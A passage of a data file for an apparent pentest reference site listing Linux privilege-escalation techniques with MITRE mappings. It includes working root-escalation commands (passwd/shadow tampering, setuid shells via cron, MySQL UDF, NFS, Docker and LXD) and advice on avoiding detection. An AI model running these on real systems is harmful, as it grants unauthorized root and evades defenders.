      { label: 'Mint a cert from a leaked SSH CA key', code: r`ssh-keygen -s ca_key -I <cert-id> -n <principal> user.pub   # then: ssh -i user -i user-cert.pub <user>@<host>`, lang: 'bash' },
      { label: 'Plant a key (if you can write ~/.ssh)', code: r`ssh-keygen -f k -N ''
install -d -m700 /home/<user>/.ssh
cat k.pub >> /home/<user>/.ssh/authorized_keys
chmod 600 /home/<user>/.ssh/authorized_keys
chown -R <user>:<user> /home/<user>/.ssh   # sshd StrictModes refuses group/world-writable or wrong-owner .ssh`, lang: 'bash' },
    ],
    tools: [{ name: 'John the Ripper', url: 'https://github.com/openwall/john' }],
    mitre: mitre('T1552.004'),
    references: [
      { label: 'MITRE ATT&CK, Private Keys (T1552.004), the private-key recovery path', url: 'https://attack.mitre.org/techniques/T1552/004/' },
      { label: 'MITRE ATT&CK, SSH Authorized Keys (T1098.004), the authorized_keys plant', url: 'https://attack.mitre.org/techniques/T1098/004/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'A new authorized_keys entry and subsequent SSH login are logged: sshd writes "Accepted publickey" to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL), plus wtmp/lastlog/journald entries. Reusing an existing key blends in far better than adding one.',
  },
  {
    id: 'lin-db-creds',
    label: 'Database Credentials → UDF',
    phase: 'creds',
    summary: 'Read secrets from a local DB, or run OS commands via a DB running as root.',
    description:
      'A locally reachable database is both a secret store and, if it runs as root, a code-execution primitive. Connect with credentials found on disk (or default/blank), then dump application password hashes and API keys for reuse. Where MySQL/MariaDB runs as root, a user-defined function (UDF) executes shell commands as the service account; PostgreSQL COPY ... PROGRAM and similar features are equivalents.',
    requires: ['Access to a local database (found or default creds), ideally one whose service runs as root'],
    commands: [
      { label: 'Connect and dump secrets', code: r`mysql -u root -p    # try creds from config files / blank
# SELECT user,authentication_string FROM mysql.user;`, lang: 'bash' },
      { label: 'MySQL UDF command exec (service as root)', code: r`SHOW VARIABLES LIKE 'plugin_dir';   -- where the .so must land
-- write the UDF library there (INTO DUMPFILE is gated by secure_file_priv):
-- SELECT 0x<hex of lib_mysqludf_sys.so> INTO DUMPFILE '<plugin_dir>/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rb; chmod +s /tmp/rb');`, lang: 'sql' },
    ],
    mitre: mitre('T1059.004'),
    references: [
      { label: 'MITRE ATT&CK, Command and Scripting Interpreter: Unix Shell (T1059.004)', url: 'https://attack.mitre.org/techniques/T1059/004/' },
      { label: 'MITRE ATT&CK, Credentials In Files (T1552.001)', url: 'https://attack.mitre.org/techniques/T1552/001/' },
      { label: 'InternalAllTheThings, MySQL UDF privilege escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
      { label: 'Bernardo Damele, Command execution with a MySQL UDF (2009)', url: 'https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html' },
    ],
    opsec: 'A UDF library dropped into the plugin directory is an on-disk artifact, and command execution from the DB process is anomalous in process telemetry. Dumping credentials is quieter than the UDF step.',
  },
  {
    id: 'lin-cred-reuse',
    label: 'Credential Reuse & Hash Cracking',
    phase: 'creds',
    summary: 'Reuse a recovered password across accounts; crack a captured hash offline.',
    description:
      'Operators reuse one password everywhere, so a secret pulled from a database, config, or vault is worth replaying against other accounts via su <user> and ssh user@host (sudo authenticates your own current password by default, so a recovered password only reaches a sudo prompt once you can log in or su as the user who owns it). When you only hold a hash (from /etc/shadow, a DB, or a keystore), crack it offline with a wordlist and rules rather than attacking a live service. A cracked root or admin password ends the chain directly.',
    requires: ['A recovered password to replay, or a captured hash to crack offline'],
    commands: [
      { label: 'Reuse a password against local accounts', code: r`su - root    # and su to other users; try the same password on ssh/services`, lang: 'bash' },
      { label: 'Crack a shadow hash', code: r`unshadow /etc/passwd /etc/shadow > u
john --wordlist=rockyou.txt u    # or: hashcat -m 1800 hash rockyou.txt`, lang: 'bash' },
    ],
    tools: [
      { name: 'John the Ripper', url: 'https://github.com/openwall/john' },
      { name: 'hashcat', url: 'https://github.com/hashcat/hashcat' },
    ],
    mitre: mitre('T1110.002'),
    references: [
      { label: 'MITRE ATT&CK, Password Cracking (T1110.002)', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { label: 'MITRE ATT&CK, Valid Accounts: Local Accounts (T1078.003)', url: 'https://attack.mitre.org/techniques/T1078/003/' },
    ],
    opsec: 'Cracking is offline and invisible to the target. Password reuse via su/ssh generates auth-log entries, and repeated failures can lock accounts or trip alerts; try the most likely account first.',
  },
  {
    id: 'lin-session-hijack',
    label: 'Session / Process Hijack',
    phase: 'creds',
    summary: 'Attach to a root tmux/screen socket, ptrace a process, or read the X11 display.',
    description:
      'A live privileged session or process leaks access to whoever can reach it. A tmux or screen server socket readable by your user lets you attach to another user root shell. A process handling a secret in cleartext can be ptraced to read its memory or keystrokes (a password on stdin, a --password argument). And a reachable X11 display can be screenshotted or keylogged for whatever the console user types.',
    requires: ['A reachable tmux/screen socket of a privileged user, a ptrace-able privileged process, or access to an X11 display'],
    commands: [
      { label: 'Hijack a tmux / screen session', code: r`ls -la /tmp/tmux-*/ /run/screen/*/
tmux -S /tmp/tmux-0/default attach     # screen -x <pid.tty>`, lang: 'bash' },
      { label: 'ptrace a process for secrets', code: r`# same-uid target: yama scope <= 1 is enough; a root/other-user target needs CAP_SYS_PTRACE or root
gdb -p <pid>    # or read /proc/<pid>/mem, dump environ/cmdline`, lang: 'bash' },
    ],
    mitre: mitre('T1563'),
    references: [
      { label: 'MITRE ATT&CK, Remote Service Session Hijacking (T1563)', url: 'https://attack.mitre.org/techniques/T1563/' },
      { label: 'MITRE ATT&CK, Input Capture: Keylogging (T1056.001)', url: 'https://attack.mitre.org/techniques/T1056/001/' },
    ],
    opsec: 'Attaching to a screen/tmux session may be visible to the legitimate user (a detached client, altered layout). ptrace is gated by kernel.yama.ptrace_scope and is a monitored syscall on hardened hosts.',
  },

  // ── Lane 5: Writable Files & Shares ─────────────────────────────────────────────
  {
    id: 'lin-passwd',
    label: 'Writable /etc/passwd',
    phase: 'files',
    summary: 'Append a UID-0 account with a known password to a writable passwd file.',
    description:
      'If /etc/passwd is writable, add your own root-equivalent account. A passwd line\'s second field can hold a crypt(3) password hash of any format ($1$ MD5, $5$ SHA-256, $6$ SHA-512, $y$ yescrypt), which takes precedence over /etc/shadow, so append an entry with UID 0 and a password hash you generated, then su to it. Even without a hash field, a writable passwd lets you point an existing account at a shell or clear a root password prompt.',
    requires: ['Write access to /etc/passwd'],
    commands: [
      { label: 'Confirm it is writable', code: r`ls -la /etc/passwd`, lang: 'bash' },
      { label: 'Append a UID-0 account and su in', code: r`openssl passwd -1 hacked            # -> $1$...hash
echo 'r00t:$1$...hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t     # password: hacked`, lang: 'bash' },
    ],
    mitre: mitre('T1136.001'),
    references: [
      { label: 'MITRE ATT&CK, Create Account: Local Account (T1136.001)', url: 'https://attack.mitre.org/techniques/T1136/001/' },
      { label: 'MITRE ATT&CK, File and Directory Permissions Modification: Linux and Mac (T1222.002), the writable-file abuse', url: 'https://attack.mitre.org/techniques/T1222/002/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (writable /etc/passwd)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'A second UID-0 account in /etc/passwd is glaring in any review and integrity monitoring flags the change. Remove the added line once you have a root shell.',
  },
  {
    id: 'lin-shadow',
    label: 'Readable / Writable /etc/shadow',
    phase: 'files',
    summary: 'Crack the root hash if shadow is readable; replace it if writable.',
    description:
      'A misconfigured /etc/shadow is a direct route to root. If it is readable, extract the root hash and crack it offline. If it is writable, replace the root hash with one you generated and su in with the matching password. Either way the account model is untouched, so the change is subtle compared with editing /etc/passwd.',
    requires: ['Read access (to crack) or write access (to replace the hash) on /etc/shadow'],
    commands: [
      { label: 'Readable: crack the root hash', code: r`unshadow /etc/passwd /etc/shadow > u
john --wordlist=/usr/share/wordlists/rockyou.txt u    # gunzip rockyou.txt.gz first if it ships compressed`, lang: 'bash' },
      { label: 'Writable: replace the root hash', code: r`openssl passwd -6 hacked      # generate a SHA-512 crypt hash
# edit /etc/shadow: set root's 2nd field to the new hash, then:
su -`, lang: 'bash' },
    ],
    tools: [{ name: 'John the Ripper', url: 'https://github.com/openwall/john' }],
    mitre: mitre('T1110.002'),
    references: [
      { label: 'MITRE ATT&CK, Password Cracking (T1110.002), readable branch: crack the dumped hash', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { label: 'MITRE ATT&CK, OS Credential Dumping: /etc/passwd and /etc/shadow (T1003.008), readable branch', url: 'https://attack.mitre.org/techniques/T1003/008/' },
      { label: 'MITRE ATT&CK, Modify Authentication Process (T1556), writable branch: replace the hash', url: 'https://attack.mitre.org/techniques/T1556/' },
      { label: 'MITRE, CWE-732: Incorrect Permission Assignment', url: 'https://cwe.mitre.org/data/definitions/732.html' },
    ],
    opsec: 'Replacing the root hash changes the real password and can lock out or alert the legitimate admin; note the original to restore it. The on-host shadow write is auditable, unlike the offline crack of a readable shadow, which is silent.',
  },
  {
    id: 'lin-filewrite',
    label: 'Arbitrary File Write / Read',
    phase: 'files',
    summary: 'Turn a root-level write (or read) primitive into code execution or disclosure.',
    description:
      'A primitive that reads or writes files with root privilege (a web bug, a setuid tool, a path-traversal, a capability) escalates when aimed at the right target. A write becomes root code execution via authorized_keys, a cron file in /etc/cron.d, a systemd unit, or /etc/passwd. A read discloses /etc/shadow, SSH keys, or a token. Pick the target that best fits what the primitive allows (full contents, an append, a specific path).',
    requires: ['A read or write primitive that operates with root (or another user) privilege on a path you can steer'],
    commands: [
      { label: 'Write → root cron job', code: r`# drop into /etc/cron.d via the primitive:
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /etc/cron.d/x
# after cron fires: /tmp/rb -p   (the -p is required or bash drops to your real uid)`, lang: 'bash' },
      { label: 'Write → SSH key; Read → shadow/keys', code: r`# write: append your pubkey to /root/.ssh/authorized_keys
# read : disclose /etc/shadow, /root/.ssh/id_rsa`, lang: 'bash' },
    ],
    mitre: mitre('T1053.003'),
    references: [
      { label: 'MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003), the cron-file write', url: 'https://attack.mitre.org/techniques/T1053/003/' },
      { label: 'MITRE ATT&CK, SSH Authorized Keys (T1098.004), the authorized_keys write', url: 'https://attack.mitre.org/techniques/T1098/004/' },
      { label: 'MITRE ATT&CK, Exploitation for Privilege Escalation (T1068), maps to the write primitive origin', url: 'https://attack.mitre.org/techniques/T1068/' },
      { label: 'MITRE, CWE-732: Incorrect Permission Assignment', url: 'https://cwe.mitre.org/data/definitions/732.html' },
    ],
    opsec: 'Files dropped into /etc/cron.d, /root/.ssh, or the systemd tree are high-signal integrity events. Choose the least-monitored target the primitive can reach and remove it after use.',
  },
  {
    id: 'lin-nfs',
    label: 'NFS no_root_squash',
    phase: 'files',
    summary: 'Plant a setuid-root binary on a share exported no_root_squash.',
    description:
      'NFSv3 trusts the UID the client supplies, and an export configured no_root_squash keeps a client root as root on the share. From a machine where you are root (often your own attack host), mount the export, write a setuid-root shell onto it, and run that binary back on the target as your unprivileged user to become root. /etc/exports (or exportfs -v) shows the no_root_squash flag; showmount -e only lists exported paths, not their options, so use it to find candidate exports and confirm no_root_squash by mounting a candidate as root, creating a test file, and verifying from the target that it is owned by uid 0.',
    requires: ['An NFS export reachable and mountable with no_root_squash, and root on some client (your own box)', 'The target mounts the same export/path, and its mount honors setuid and execution (not nosuid/noexec), so the low-priv user can run the planted file from there'],
    commands: [
      { label: 'List candidate exports', code: r`cat /etc/exports 2>/dev/null; exportfs -v 2>/dev/null   # server-side: shows the no_root_squash option
showmount -e <nfs-server>                              # remote: only lists exported paths, not their options`, lang: 'bash' },
      { label: 'Check the target-side mount is exec + suid', code: r`findmnt -no OPTIONS /share    # or: mount | grep nfs   (watch for nosuid/noexec)`, lang: 'bash' },
      { label: 'Plant a setuid shell as root, run on target', code: r`# on a box where you are root:
mount -t nfs <server>:/share /mnt
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
# back on the target as the low-priv user:
/share/rootbash -p`, lang: 'bash' },
    ],
    mitre: mitre('T1548.001'),
    references: [
      { label: 'MITRE ATT&CK, Setuid and Setgid (T1548.001)', url: 'https://attack.mitre.org/techniques/T1548/001/' },
      { label: 'InternalAllTheThings, NFS no_root_squash', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'The setuid binary on the share is visible to anyone inspecting the export, and its execution as root shows in process auditing. Remove it once you have a shell. Architecture matters: the planted binary runs on the target, so if your box and the target differ (CPU arch or glibc version) copy the target\'s own /bin/bash over the mount, or drop a statically-linked shell, rather than your attack host\'s binary.',
  },

  // ── Lane 6: Privileged Groups & Containers ──────────────────────────────────────
  {
    id: 'lin-group-privesc',
    label: 'Dangerous Group Membership',
    phase: 'containers',
    summary: 'disk (raw block-device = read/rewrite any file) is root-equivalent; shadow, adm, and video grant access that shortcuts or leads to root.',
    description:
      'Supplementary group membership confers access independent of sudo, and several groups are effectively root. disk grants raw access to block devices (read /dev/sda to pull /etc/shadow and other root-owned files; writing a root-owned file is not casual, debugfs refuses it and raw-device surgery on a live mount is fragile). shadow reads password hashes to crack. adm reads sensitive logs. video captures the console framebuffer. Check id for a group that shortcuts to root, and abuse the access it grants.',
    requires: ['Membership in a root-equivalent group (disk, shadow, adm, video) or another group with sensitive access'],
    commands: [
      { label: 'Check your groups', code: r`id; getent group disk shadow adm video`, lang: 'bash' },
      { label: 'disk group: read the raw filesystem', code: r`debugfs -R 'cat /etc/shadow' /dev/sda1     # or dd the device`, lang: 'bash' },
    ],
    mitre: mitre('T1078.003'),
    references: [
      { label: 'MITRE ATT&CK, Valid Accounts: Local Accounts (T1078.003)', url: 'https://attack.mitre.org/techniques/T1078/003/' },
      { label: 'MITRE ATT&CK, Direct Volume Access (T1006), the disk-group raw-device read', url: 'https://attack.mitre.org/techniques/T1006/' },
      { label: 'InternalAllTheThings, Interesting Groups (Linux)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Reading a block device or the framebuffer is unusual for a normal user and observable by auditd. The access is legitimate for the group, so the anomaly is in what you do with it.',
  },
  {
    id: 'lin-docker',
    label: 'Docker Socket / Group',
    phase: 'containers',
    summary: 'Access to the Docker daemon is root: mount the host and break out.',
    description:
      'The Docker daemon runs as root, so any principal that can talk to it (membership in the docker group, or a readable /var/run/docker.sock) is effectively root on the host. Run a container that bind-mounts the host filesystem and chroot into it, or write a setuid binary onto the host from inside. No container escape bug is needed; this is the daemon working as designed.',
    requires: ['Membership in the docker group or access to the Docker socket (/var/run/docker.sock)'],
    commands: [
      { label: 'Confirm access', code: r`id -nG | grep -qw docker && echo 'in docker group'; ls -la /var/run/docker.sock; docker ps`, lang: 'bash' },
      { label: 'Mount the host and get root', code: r`docker run -v /:/host --rm -it alpine chroot /host bash
# or drop a setuid bash onto the host from the container`, lang: 'bash' },
    ],
    mitre: mitre('T1611'),
    references: [
      { label: 'MITRE ATT&CK, Escape to Host (T1611)', url: 'https://attack.mitre.org/techniques/T1611/' },
      { label: 'InternalAllTheThings, Docker Breakout / socket abuse', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Starting a privileged container that mounts / is a loud, well-known pattern in container-runtime and EDR telemetry. The docker CLI logs to the daemon journal.',
  },
  {
    id: 'lin-lxd',
    label: 'LXD Group',
    phase: 'containers',
    summary: 'The lxd group drives the root LXD daemon; mount the host in a container.',
    description:
      'Membership in the lxd group (the group owning the LXD daemon Unix socket) lets you drive the LXD daemon, which runs as root. Import a small image, launch a privileged container that bind-mounts the host root filesystem, and read or write it as root from inside the container. Like the Docker socket, this is the daemon trusting the group rather than a vulnerability.',
    requires: ['Membership in the lxd group'],
    commands: [
      { label: 'Confirm and initialise', code: r`id | grep -o lxd; lxd init --auto`, lang: 'bash' },
      { label: 'Privileged container mounting the host', code: r`lxc image import ./alpine.tar.gz --alias a
lxc launch a p -c security.privileged=true
lxc config device add p host disk source=/ path=/mnt/root recursive=true
lxc exec p /bin/sh    # host FS is at /mnt/root`, lang: 'bash' },
    ],
    mitre: mitre('T1611'),
    references: [
      { label: 'MITRE ATT&CK, Escape to Host (T1611)', url: 'https://attack.mitre.org/techniques/T1611/' },
      { label: 'InternalAllTheThings, LXD/LXC Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Creating a privileged container and adding a host disk device is recorded by LXD and is anomalous on a host that does not normally run user containers.',
  },
  {
    id: 'lin-container-escape',
    label: 'Container Escape',
    phase: 'containers',
    summary: 'Break out of an over-permissioned container to the host: privileged, caps, cgroups.',
    description:
      'First confirm you are inside a container (/.dockerenv, cgroup names, a sparse process table). A privileged container, or one granted CAP_SYS_ADMIN or a host mount, escapes by design: abuse the release_agent via cgroups (CVE-2022-0492 where notify_on_release is reachable), mount the host disk, or load a kernel module. A mounted Docker/containerd socket inside the container is the same daemon-abuse path as on the host.',
    requires: ['Execution inside a container that is privileged, holds a dangerous capability, mounts host paths, or exposes a runtime socket'],
    commands: [
      { label: 'Detect the container and its powers', code: r`ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup
capsh --print 2>/dev/null || grep Cap /proc/self/status   # procfs fallback where capsh is absent (minimal/distroless images)
mount | grep -iE 'docker|overlay|host'`, lang: 'bash' },
      { label: 'cgroups release_agent escape (privileged)', code: r`# CVE-2022-0492 class: write a release_agent that runs on the host
# requires cgroup v1 (release_agent/notify_on_release are v1-only); on cgroup v2-only
# hosts (/proc/1/cgroup shows a single 0::/ line) pivot to a host mount, kernel module,
# or a mounted runtime socket instead
# see the Unit 42 writeup below for the full cgroupfs-mount / notify_on_release sequence`, lang: 'bash' },
    ],
    mitre: mitre('T1611'),
    references: [
      { label: 'MITRE ATT&CK, Escape to Host (T1611)', url: 'https://attack.mitre.org/techniques/T1611/' },
      { label: 'NVD, CVE-2022-0492 (cgroups release_agent)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-0492' },
      { label: 'Unit 42, CVE-2022-0492 cgroups escape (Yuval Avrahami)', url: 'https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/' },
    ],
    opsec: 'Escapes touch the host from inside a container, which is exactly what container security monitoring watches for (release_agent writes, host mounts, unexpected host processes).',
  },
  {
    id: 'lin-container-cve',
    label: 'Container Runtime CVEs',
    phase: 'containers',
    summary: 'Escape via a runtime bug: Leaky Vessels (runc), the 2025 runc trio.',
    description:
      'Even a well-scoped container falls to a bug in the runtime itself. Leaky Vessels (CVE-2024-21626) abuses a leaked file descriptor so a container process working directory resolves into the host filesystem, allowing a full escape on runc <=1.1.11. The November 2025 runc trio (CVE-2025-31133 / 52565 / 52881) abuses masked-path and mount races to redirect writes into /proc and break out. Match the runc version to the CVE.',
    requires: ['A container on a vulnerable runtime version (runc <=1.1.11 for Leaky Vessels; the fixed 1.2.8/1.3.3/1.4.0-rc.3 close the 2025 trio)'],
    commands: [
      { label: 'Identify the runtime version', code: r`runc --version 2>/dev/null; docker version 2>/dev/null | grep -i runc`, lang: 'bash' },
    ],
    mitre: mitre('T1611'),
    references: [
      { label: 'NVD, CVE-2024-21626 (Leaky Vessels, runc)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21626' },
      { label: 'Wiz, Leaky Vessels container escapes', url: 'https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities' },
      { label: 'Sysdig, runc container-escape CVEs (2025)', url: 'https://www.sysdig.com/blog/runc-container-escape-vulnerabilities' },
      { label: 'Snyk Labs, Leaky Vessels original disclosure (CVE-2024-21626)', url: 'https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/' },
      { label: 'runc, GHSA-xr7r-f8xq-vfvv advisory (CVE-2024-21626)', url: 'https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv' },
    ],
    opsec: 'Runtime exploits are version-specific; confirm the runc build first. The escape produces host-side activity (new host processes, writes outside the container) that runtime monitoring flags.',
  },

  // ── Lane 7: Kernel & Library Exploits ──────────────────────────────────────────
  {
    id: 'lin-kernel-exploit',
    label: 'Kernel Exploit',
    phase: 'kernel',
    summary: 'Match the kernel version to a public exploit: Dirty Pipe, GameOver(lay), nf_tables.',
    description:
      'When the configuration is clean, the kernel itself is the target. Fingerprint the exact kernel and distro point release, then match it to a public exploit. Dirty Pipe (CVE-2022-0847) overwrites read-only files via a pipe-buffer flaw on 5.8+. GameOver(lay) (CVE-2023-2640 / 32629) abuses Ubuntu OverlayFS. nf_tables use-after-frees (CVE-2024-1086, CVE-2023-32233) are the modern memory-corruption workhorses, with io_uring (CVE-2024-0582, a narrow 6.4-6.7 patch-gap UAF) a more situational option; DirtyCow (CVE-2016-5195) still applies to old kernels. Prefer a public exploit matched to the exact version over a shotgun.',
    requires: ['A kernel/distro version matching a known local-privesc exploit (and, for some, unprivileged user namespaces enabled)'],
    commands: [
      { label: 'Fingerprint the kernel', code: r`uname -r; cat /etc/os-release
# then match against exploit-db / the CVE, e.g. Dirty Pipe on 5.8-5.16.x`, lang: 'bash' },
      { label: 'Check namespace reachability', code: r`cat /proc/sys/user/max_user_namespaces
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null   # Ubuntu 23.10+ real gate (1 = restricted)
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null        # Debian/Ubuntu legacy knob
unshare -Ur id                                                    # live test: EUID 0 in the new userns means reachable`, lang: 'bash' },
    ],
    tools: [
      { name: 'linux-exploit-suggester', url: 'https://github.com/The-Z-Labs/linux-exploit-suggester' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2022-0847 (Dirty Pipe)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-0847' },
      { label: 'NVD, CVE-2024-1086 (nf_tables use-after-free)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-1086' },
      { label: 'Ubuntu, CVE-2023-2640 (GameOver(lay))', url: 'https://ubuntu.com/security/CVE-2023-2640' },
      { label: 'Max Kellermann, The Dirty Pipe Vulnerability (CVE-2022-0847)', url: 'https://dirtypipe.cm4all.com/' },
      { label: 'Notselwyn, Flipping Pages nf_tables writeup (CVE-2024-1086)', url: 'https://pwning.tech/nftables/' },
    ],
    opsec: 'Kernel exploits can panic the box; run a version-matched, tested PoC, not a blind attempt. A crash and reboot are the loudest possible outcome. Some paths need unprivileged user namespaces, which hardened hosts disable.',
  },
  {
    id: 'lin-glibc',
    label: 'glibc / Loader (Looney Tunables)',
    phase: 'kernel',
    summary: 'Exploit a bug in glibc or the dynamic loader for root.',
    description:
      'The C library and dynamic loader are as privileged a target as the kernel. Looney Tunables (CVE-2023-4911) is a buffer overflow in ld.so parsing GLIBC_TUNABLES, reachable through any setuid binary on glibc 2.34+ across default Fedora/Ubuntu/Debian installs. A separate glibc bug class is the __vsyslog_internal heap overflows (CVE-2023-6246 / 6779): these live in the syslog()/vsyslog() code path, not the loader, and are triggered when a privileged program itself calls syslog() with an oversized argv[0] or message, not through the setuid loader. They were introduced in glibc 2.37 (CVE-2023-6246 backported to 2.36) and do not exist on 2.34/2.35. musl-based distros (Alpine) are unaffected. Check the glibc version before firing.',
    requires: ['A vulnerable glibc version (2.34+ for Looney Tunables, triggered via a setuid binary through the loader; the syslog CVEs are 2.36/2.37+ and need a privileged program that calls syslog())'],
    commands: [
      { label: 'Check the glibc version', code: r`ldd --version | head -1
# or run libc directly for a version banner (path is distro-specific):
$(ldd $(which ls) | grep -o '/.*/libc.so.6')   # Debian/Ubuntu: /lib/x86_64-linux-gnu/libc.so.6, Fedora/RHEL: /lib64/libc.so.6`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2023-4911 (Looney Tunables)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-4911' },
      { label: 'Qualys, Looney Tunables (CVE-2023-4911)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so' },
      { label: 'Qualys TRU, glibc syslog() overflows (CVE-2023-6246 / 6779)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2024/01/30/qualys-tru-discovers-important-vulnerabilities-in-gnu-c-librarys-syslog' },
    ],
    opsec: 'A failed loader exploit can crash the triggering process and leave core dumps. The version gate is strict; confirm glibc before attempting.',
  },
  {
    id: 'lin-polkit',
    label: 'polkit / pkexec (PwnKit)',
    phase: 'kernel',
    summary: 'Abuse the polkit authorization stack: PwnKit, or the 2025 udisks chain.',
    description:
      'The polkit/D-Bus authorization stack repeatedly grants local root. PwnKit (CVE-2021-4034) is a memory-corruption bug in pkexec exploitable by any local user on years of default installs. The 2025 story is authorization abuse rather than memory corruption: CVE-2025-6018 makes an SSH session count as allow_active on SUSE, and CVE-2025-6019 (libblockdev via udisks, default on most distros) lets an allow_active user mount a crafted filesystem without nosuid and run a planted setuid shell. Check pkexec/polkit versions.',
    requires: ['A vulnerable polkit/pkexec (PwnKit) or a udisks/libblockdev stack reachable with allow_active'],
    commands: [
      { label: 'Check versions', code: r`pkexec --version
dpkg -l 2>/dev/null | grep -E 'polkit|pkexec|udisks|libblockdev'     # Debian/Ubuntu (polkitd/pkexec after the packaging split)
rpm -qa 2>/dev/null | grep -Ei 'polkit|pkexec|udisks|libblockdev'    # SUSE/Fedora (the CVE-2025-6018 target)`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2021-4034 (PwnKit)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-4034' },
      { label: 'Qualys, PwnKit (CVE-2021-4034)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034' },
      { label: 'Qualys, LPE chain in SUSE via udisks (CVE-2025-6018/6019)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks' },
    ],
    opsec: 'PwnKit is reliable but well-signatured; EDR and auditd rules for pkexec abuse are widespread. The udisks path mounts a filesystem, which is an observable event.',
  },
  {
    id: 'lin-service-cve',
    label: 'Service Version Exploit',
    phase: 'kernel',
    summary: 'Identify a local service or app by exact version and run its public exploit.',
    description:
      'Beyond the kernel and core libraries, a locally running or setuid service can carry its own CVE. Fingerprint the exact version of anything privileged (a management daemon, a monitoring agent, an old setuid utility like screen 4.5.0, a printer stack like CUPS) and match it to a public exploit or PoC. needrestart (CVE-2024-48990), which runs as root during package operations on Ubuntu, is a recent high-value example handled in its own note.',
    requires: ['A privileged local service or setuid app whose exact version matches a public exploit'],
    commands: [
      { label: 'Version the privileged software', code: r`dpkg -l 2>/dev/null | less; rpm -qa 2>/dev/null
<service> --version    # for each root-run/setuid program`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'MITRE ATT&CK, Exploitation for Privilege Escalation (T1068)', url: 'https://attack.mitre.org/techniques/T1068/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (software versions)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'A version-matched exploit is far quieter than a blind one. Some service exploits restart or crash the daemon; weigh the disruption on a monitored host.',
  },
  {
    id: 'lin-needrestart',
    label: 'needrestart (CVE-2024-48990)',
    phase: 'kernel',
    summary: 'needrestart runs as root and trusts attacker env vars during package ops.',
    description:
      'needrestart, installed by default on Ubuntu Server, runs as root after package operations. It scans running processes and, for each one it thinks uses a Python/Ruby interpreter, re-reads PYTHONPATH/RUBYLIB from that process\'s /proc/<pid>/environ and passes it to the interpreter it launches as root. Keep a long-running process alive with a poisoned PYTHONPATH pointing at an attacker-writable dir, and when a package op triggers needrestart your module loads as root. The Qualys advisory covers the family (CVE-2024-48990/48991/48992 and related). Fixed in needrestart 3.8; check the installed version.',
    requires: ['needrestart < 3.8 present, and a running process needrestart identifies as a Python/Ruby interpreter that carries a poisoned PYTHONPATH/RUBYLIB in its environment at scan time'],
    commands: [
      { label: 'Check the version', code: r`needrestart --version 2>/dev/null; dpkg -l needrestart 2>/dev/null`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Qualys, needrestart LPE (CVE-2024-48990 family)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart' },
      { label: 'NVD, CVE-2024-48990', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-48990' },
    ],
    opsec: 'The trigger depends on needrestart running (a package install/upgrade), which may not be attacker-controlled. The interpreter loading an unexpected module as root is the observable signal.',
  },
  {
    id: 'lin-kernel-recent',
    label: 'Recent Named LPEs (awareness)',
    phase: 'kernel',
    summary: 'Awareness only: Copy Fail, Dirty Frag, the ptrace LPE, nf_tables 2026.',
    description:
